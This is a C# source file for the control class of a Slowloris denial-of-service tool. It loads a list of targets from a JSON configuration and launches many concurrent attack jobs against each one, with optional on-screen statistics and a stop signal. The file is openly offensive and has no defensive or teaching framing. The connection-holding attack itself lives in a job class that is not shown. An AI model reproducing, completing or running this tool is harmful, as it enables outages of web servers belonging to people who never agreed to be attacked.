using Newtonsoft.Json;

internal class Slowloris
{
    private readonly List<SlowlorisJob> _jobs;
    private readonly AutoResetEvent _signalHandle;
    private readonly ConsoleScreen? _screen;

    public bool IsRunning => !_signalHandle.WaitOne(0);

    public Slowloris(RuntimeConfiguration configuration)
    {
        _jobs = new List<SlowlorisJob>();
        _signalHandle = new AutoResetEvent(false);
        if (configuration.showStatistics)
        {
            _screen = new ConsoleScreen();
        }
    }

    private Configuration ParseConfiguration()
    {
        const string CFG_FILE_NAME = "configuration.json";

        if (!File.Exists(CFG_FILE_NAME))
            throw new FileNotFoundException(CFG_FILE_NAME);

        return JsonConvert.DeserializeObject<Configuration>(File.ReadAllText(CFG_FILE_NAME))!;
    }

    public void Start()
    {
        var configuration = ParseConfiguration();
        _screen?.BuildScreen(configuration);

        foreach (var t in configuration.targets)
        {
            ThreadPool.QueueUserWorkItem<TargetInfo>(
                async (target) =>
                {
                    List<Task> tasks = new();
                    for (int i = 0; i < target.concurrency; i++)
                    {
                        var job = new SlowlorisJob(target, _signalHandle);
                        _jobs.Add(job);
                        tasks.Add(job.Run());
                    }
                    await Task.WhenAll(tasks.ToArray());
                },
                t,
                false);
        }
    }

    public void Stop()
    {
        _signalHandle.Set();
        while (_jobs.Any())
        {
            if (_jobs[0].IsRunning)
            {
                _signalHandle.Set();
                continue;
            }

            _jobs.RemoveAt(0);
        }
    }
}